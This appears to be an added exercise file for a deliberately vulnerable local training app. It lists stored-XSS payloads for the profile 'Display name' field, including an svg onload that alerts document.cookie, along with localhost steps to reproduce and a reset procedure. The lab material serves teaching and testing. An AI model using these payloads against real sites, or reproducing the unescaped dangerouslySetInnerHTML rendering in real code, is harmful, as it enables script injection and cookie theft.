@@ -1,0 +1,20 @@
+LOCAL, APP-ONLY stored-XSS payloads for THIS app's profile "Display name" field.
+Target: [VULN: Stored XSS — Task 3]  (src/app/api/profile/route.ts stores it raw;
+src/app/dashboard/page.tsx and src/app/profile/page.tsx render it with
+dangerouslySetInnerHTML).
+
+How to reproduce (localhost only):
+  1. npm run dev, then log in at http://127.0.0.1:3000/login
+     (e.g. ada.learner@campus.local / ada-pw-2025).
+  2. Go to /profile and paste one payload below into "Display name", save.
+  3. Load /dashboard (or /profile). The payload executes because the value is
+     rendered as raw HTML instead of being escaped.
+
+Payloads:
+  <img src=x onerror="alert('xss-on-dashboard')">
+  <img src=x onerror="document.title='XSS'">
+  <svg onload="alert(document.cookie)">
+  <b style="color:red">not-really-my-name</b>
+
+Reset afterwards: set the display name back to plain text (e.g. "Ada Learner")
+or re-run `npm run db:reset`.
